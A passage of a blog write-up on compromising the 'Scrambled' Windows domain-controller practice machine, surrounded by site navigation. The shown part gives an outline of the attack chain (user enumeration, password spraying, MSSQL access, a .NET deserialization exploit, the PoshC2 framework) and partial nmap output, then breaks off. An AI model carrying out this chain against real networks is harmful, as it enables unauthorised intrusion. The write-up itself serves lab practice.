
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="prev" href="../../monitors/monitors/">
      
      
        <link rel="next" href="../../shoker/writeup/">
      
      <link rel="icon" href="../../../../assets/logo.png">
      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.0.10">
    
    
      
        <title>Writeup - Blog</title>
      
    
    
      <link rel="stylesheet" href="../../../../assets/stylesheets/main.0d440cfe.min.css">
      
        
        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.2505c338.min.css">
      
      

    
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:300,300i,400,400i,700,700i%7CSource+Code+Pro:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Ubuntu";--md-code-font:"Source Code Pro"}</style>
      
    
    
    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="">
  
    
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#overview" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../../.." title="Blog" class="md-header__button md-logo" aria-label="Blog" data-md-component="logo">
      
  <img src="../../../../assets/logo.png" alt="logo">

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Blog
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Writeup
            
          </span>
        </div>
      </div>
    </div>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        
  
  


  <li class="md-tabs__item">
    <a href="../../../.." class="md-tabs__link">
      Security Stuff
    </a>
  </li>

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../../../AD/" class="md-tabs__link">
        AD
      </a>
    </li>
  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../../../Posts/basic_av_evasion/" class="md-tabs__link">
        Posts
      </a>
    </li>
  

      
        
  
  
    
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../../" class="md-tabs__link md-tabs__link--active">
        Writeups
      </a>
    </li>
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../../.." title="Blog" class="md-nav__button md-logo" aria-label="Blog" data-md-component="logo">
      
  <img src="../../../../assets/logo.png" alt="logo">

    </a>
    Blog
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../../.." class="md-nav__link">
        Security Stuff
      </a>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
      
      
      
        <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
          AD
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_2">
          <span class="md-nav__icon md-icon"></span>
          AD
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../../AD/" class="md-nav__link">
        General
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
      
      
      
        <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
          Posts
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          Posts
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Posts/basic_av_evasion/" class="md-nav__link">
        Basic Anti-Virus Evasion
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Posts/osint_into_da/" class="md-nav__link">
        From OSINT Into Domain Admin
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
      
      
      
        <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
          Writeups
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
        <label class="md-nav__title" for="__nav_4">
          <span class="md-nav__icon md-icon"></span>
          Writeups
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../" class="md-nav__link">
        Overview
      </a>
    </li>
  

            
          
            
              
  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" checked>
      
      
      
        <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
          Machines
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="true">
        <label class="md-nav__title" for="__nav_4_2">
          <span class="md-nav__icon md-icon"></span>
          Machines
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_1" >
      
      
      
        <label class="md-nav__link" for="__nav_4_2_1" id="__nav_4_2_1_label" tabindex="0">
          Active
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_1_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_4_2_1">
          <span class="md-nav__icon md-icon"></span>
          Active
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../active/writeup/" class="md-nav__link">
        Active
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_2" >
      
      
      
        <label class="md-nav__link" for="__nav_4_2_2" id="__nav_4_2_2_label" tabindex="0">
          Bastian
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_2_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_4_2_2">
          <span class="md-nav__icon md-icon"></span>
          Bastian
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../bastian/writeup/" class="md-nav__link">
        Bastian
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_3" >
      
      
      
        <label class="md-nav__link" for="__nav_4_2_3" id="__nav_4_2_3_label" tabindex="0">
          Flight
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_3_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_4_2_3">
          <span class="md-nav__icon md-icon"></span>
          Flight
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../flight/writeup/" class="md-nav__link">
        Overview
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_4" >
      
      
      
        <label class="md-nav__link" for="__nav_4_2_4" id="__nav_4_2_4_label" tabindex="0">
          Intelligence
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_4_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_4_2_4">
          <span class="md-nav__icon md-icon"></span>
          Intelligence
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../intelligence/Intelligence/" class="md-nav__link">
        Intelligence
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_5" >
      
      
      
        <label class="md-nav__link" for="__nav_4_2_5" id="__nav_4_2_5_label" tabindex="0">
          Knife
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_5_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_4_2_5">
          <span class="md-nav__icon md-icon"></span>
          Knife
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../knife/knife-writeup/" class="md-nav__link">
        Knife
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_6" >
      
      
      
        <label class="md-nav__link" for="__nav_4_2_6" id="__nav_4_2_6_label" tabindex="0">
          Love
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_6_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_4_2_6">
          <span class="md-nav__icon md-icon"></span>
          Love
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../love/love/" class="md-nav__link">
        Love Write-up
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_7" >
      
      
      
        <label class="md-nav__link" for="__nav_4_2_7" id="__nav_4_2_7_label" tabindex="0">
          Monitors
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_7_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_4_2_7">
          <span class="md-nav__icon md-icon"></span>
          Monitors
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../monitors/monitors/" class="md-nav__link">
        Monitors
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_8" checked>
      
      
      
        <label class="md-nav__link" for="__nav_4_2_8" id="__nav_4_2_8_label" tabindex="0">
          Scrambled
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_8_label" aria-expanded="true">
        <label class="md-nav__title" for="__nav_4_2_8">
          <span class="md-nav__icon md-icon"></span>
          Scrambled
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          Writeup
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        Writeup
      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#overview" class="md-nav__link">
    Overview
  </a>
  
    <nav class="md-nav" aria-label="Overview">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#machine-info" class="md-nav__link">
    Machine Info
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#walkthrough" class="md-nav__link">
    Walkthrough
  </a>
  
    <nav class="md-nav" aria-label="Walkthrough">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#attack-scenario-diagram" class="md-nav__link">
    Attack Scenario Diagram
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#recon" class="md-nav__link">
    Recon
  </a>
  
    <nav class="md-nav" aria-label="Recon">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#nmap" class="md-nav__link">
    nmap
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web-enumeration" class="md-nav__link">
    Web Enumeration
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#user-enumeration" class="md-nav__link">
    User Enumeration
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#password-spray" class="md-nav__link">
    Password Spray
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumerate-spns" class="md-nav__link">
    Enumerate SPNs
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumerate-shares" class="md-nav__link">
    Enumerate Shares
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#access-mssql" class="md-nav__link">
    Access MSSQL
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#configuring-poshc2" class="md-nav__link">
    Configuring PoshC2
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#obtaining-access" class="md-nav__link">
    Obtaining Access
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pivot-to-miscsql" class="md-nav__link">
    Pivot to MiscSQL
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privilege-escalation" class="md-nav__link">
    Privilege Escalation
  </a>
  
    <nav class="md-nav" aria-label="Privilege Escalation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumerating-sales-app" class="md-nav__link">
    Enumerating Sales App
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lesson-learned" class="md-nav__link">
    Lesson Learned
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_9" >
      
      
      
        <label class="md-nav__link" for="__nav_4_2_9" id="__nav_4_2_9_label" tabindex="0">
          Shoker
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_9_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_4_2_9">
          <span class="md-nav__icon md-icon"></span>
          Shoker
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../shoker/writeup/" class="md-nav__link">
        Shocker Write-up
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#overview" class="md-nav__link">
    Overview
  </a>
  
    <nav class="md-nav" aria-label="Overview">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#machine-info" class="md-nav__link">
    Machine Info
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#walkthrough" class="md-nav__link">
    Walkthrough
  </a>
  
    <nav class="md-nav" aria-label="Walkthrough">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#attack-scenario-diagram" class="md-nav__link">
    Attack Scenario Diagram
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#recon" class="md-nav__link">
    Recon
  </a>
  
    <nav class="md-nav" aria-label="Recon">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#nmap" class="md-nav__link">
    nmap
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web-enumeration" class="md-nav__link">
    Web Enumeration
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#user-enumeration" class="md-nav__link">
    User Enumeration
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#password-spray" class="md-nav__link">
    Password Spray
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumerate-spns" class="md-nav__link">
    Enumerate SPNs
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumerate-shares" class="md-nav__link">
    Enumerate Shares
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#access-mssql" class="md-nav__link">
    Access MSSQL
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#configuring-poshc2" class="md-nav__link">
    Configuring PoshC2
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#obtaining-access" class="md-nav__link">
    Obtaining Access
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pivot-to-miscsql" class="md-nav__link">
    Pivot to MiscSQL
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privilege-escalation" class="md-nav__link">
    Privilege Escalation
  </a>
  
    <nav class="md-nav" aria-label="Privilege Escalation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumerating-sales-app" class="md-nav__link">
    Enumerating Sales App
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lesson-learned" class="md-nav__link">
    Lesson Learned
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  



  <h1>Writeup</h1>

<h2 id="overview">Overview<a class="headerlink" href="#overview" title="Permanent link">&para;</a></h2>
<p><img alt="" src="../writeup.assets/image-20220715043908724.png" /></p>
<p>Scrambled machine was a Domain Controller which attracted me to walk through it. The attack scenario was interesting where it starts from hunting for domain users, pivoting into service accounts, .NET source code review and exploiting application using deserialization vulnerability. The box contains multiple pivoting points to reach the Domain Admin. However, I did not like that the NTLM authentication is disabled in the box, I had multiple issues while using Impacket's tools that took me time to solve those issues. In this blog, I'll demonstrate the attack scenario to Pwn this box with the help of PoshC2 framework. PoshC2 is very powerful tool for red teamers and can be customizable. However, because of the box doesn't have AV solution, I'll use the default profile/configuration of PoshC2. </p>
<h3 id="machine-info">Machine Info<a class="headerlink" href="#machine-info" title="Permanent link">&para;</a></h3>
<table>
<thead>
<tr>
<th>Operating System</th>
<th>Difficulty</th>
<th>IP</th>
</tr>
</thead>
<tbody>
<tr>
<td>Windows</td>
<td>Medium</td>
<td>10.10.11.168</td>
</tr>
</tbody>
</table>
<h2 id="walkthrough">Walkthrough<a class="headerlink" href="#walkthrough" title="Permanent link">&para;</a></h2>
<h3 id="attack-scenario-diagram">Attack Scenario Diagram<a class="headerlink" href="#attack-scenario-diagram" title="Permanent link">&para;</a></h3>
<p><img alt="" src="../writeup.assets/exported-diagram.png" /></p>
<h2 id="recon">Recon<a class="headerlink" href="#recon" title="Permanent link">&para;</a></h2>
<h3 id="nmap">nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code>PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w">       </span>REASON<span class="w">  </span>VERSION
<span class="m">53</span>/tcp<span class="w">   </span>open<span class="w">  </span>domain<span class="w">        </span>syn-ack<span class="w"> </span>Simple<span class="w"> </span>DNS<span class="w"> </span>Plus
<span class="m">80</span>/tcp<span class="w">   </span>open<span class="w">  </span>http<span class="w">          </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>IIS<span class="w"> </span>httpd<span class="w"> </span><span class="m">10</span>.0
<span class="p">|</span><span class="w"> </span>http-methods:<span class="w"> </span>
<span class="p">|</span><span class="w">   </span>Supported<span class="w"> </span>Methods:<span class="w"> </span>OPTIONS<span class="w"> </span>TRACE<span class="w"> </span>GET<span class="w"> </span>HEAD<span class="w"> </span>POST
<span class="p">|</span>_<span class="w">  </span>Potentially<span class="w"> </span>risky<span class="w"> </span>methods:<span class="w"> </span>TRACE
<span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-IIS/10.0
<span class="p">|</span>_http-title:<span class="w"> </span>Scramble<span class="w"> </span>Corp<span class="w"> </span>Intranet
<span class="m">88</span>/tcp<span class="w">   </span>open<span class="w">  </span>kerberos-sec<span class="w">  </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Kerberos<span class="w"> </span><span class="o">(</span>server<span class="w"> </span>time:<span class="w"> </span><span class="m">2022</span>-07-15<span class="w"> </span><span class="m">08</span>:40:57Z<span class="o">)</span>
<span class="m">135</span>/tcp<span class="w">  </span>open<span class="w">  </span>msrpc<span class="w">         </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
<span class="m">139</span>/tcp<span class="w">  </span>open<span class="w">  </span>netbios-ssn<span class="w">   </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>netbios-ssn
<span class="m">389</span>/tcp<span class="w">  </span>open<span class="w">  </span>ldap<span class="w">          </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>scrm.local0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>DC1.scrm.local
<span class="p">|</span><span class="w"> </span>Subject<span class="w"> </span>Alternative<span class="w"> </span>Name:<span class="w"> </span>othername:&lt;unsupported&gt;,<span class="w"> </span>DNS:DC1.scrm.local
<span class="p">|</span><span class="w"> </span>Issuer:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>scrm-DC1-CA/domainComponent<span class="o">=</span>scrm
<span class="m">445</span>/tcp<span class="w">  </span>open<span class="w">  </span>microsoft-ds?<span class="w"> </span>syn-ack
<span class="m">464</span>/tcp<span class="w">  </span>open<span class="w">  </span>kpasswd5?<span class="w">     </span>syn-ack
<span class="m">593</span>/tcp<span class="w">  </span>open<span class="w">  </span>ncacn_http<span class="w">    </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
<span class="m">636</span>/tcp<span class="w">  </span>open<span class="w">  </span>ssl/ldap<span class="w">      </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>scrm.local0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>DC1.scrm.local
<span class="p">|</span><span class="w"> </span>Subject<span class="w"> </span>Alternative<span class="w"> </span>Name:<span class="w"> </span>othername:&lt;unsupported&gt;,<span class="w"> </span>DNS:DC1.scrm.local
<span class="p">|</span><span class="w"> </span>Issuer:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>scrm-DC1-CA/domainComponent<span class="o">=</span>scrm
<span class="m">1433</span>/tcp<span class="w"> </span>open<span class="w">  </span>ms-sql-s<span class="w">      </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>SQL<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span><span class="m">15</span>.00.2000.00<span class="p">;</span><span class="w"> </span>RTM
<span class="m">3268</span>/tcp<span class="w"> </span>open<span class="w">  </span>ldap<span class="w">          </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>scrm.local0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>DC1.scrm.local
<span class="p">|</span><span class="w"> </span>Subject<span class="w"> </span>Alternative<span class="w"> </span>Name:<span class="w"> </span>othername:&lt;unsupported&gt;,<span class="w"> </span>DNS:DC1.scrm.local
